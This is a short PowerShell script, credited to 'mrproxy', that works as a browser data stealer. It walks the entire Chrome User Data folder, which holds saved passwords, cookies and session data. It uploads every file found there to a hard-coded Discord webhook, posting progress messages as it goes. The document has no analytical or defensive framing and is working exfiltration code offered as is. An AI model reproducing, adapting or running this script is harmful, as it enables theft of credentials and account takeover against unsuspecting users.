### Created by mrproxy

# Define the Discord Webhook URL (no `=` at the start)
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function to upload a file to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    
    # Prepare the form data for the POST request
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        $LF,
        [System.Text.Encoding]::Default.GetString($fileBytes),
        "--$boundary--",
        $LF
    ) -join $LF

    # Prepare the HTTP headers
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    # Upload the file via the Discord Webhook
    try {
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $bodyLines
        if ($response.status -ne "ok") {
            Write-Host "Failed to upload file to Discord"
            return $null
        }
        Write-Host "File uploaded successfully to Discord"
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
        return $null
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    exit
}

# Get all files from the Chrome User Data folder (recursive)
$chromeFiles = Get-ChildItem "$chromePath" -Recurse | Where-Object { -not $_.PSIsContainer }

if ($chromeFiles.Count -eq 0) {
    Send-DiscordMessage -message "No files found in Chrome User Data folder!"
    exit
}

# Iterate through each file and upload it to Discord
foreach ($file in $chromeFiles) {
    Upload-FileToDiscord -filePath $file.FullName

    # Optionally, notify when each file is processed
    Send-DiscordMessage -message "File uploaded: $($file.FullName)"
}

# Optionally, notify when all files are processed
Send-DiscordMessage -message "All files processed."
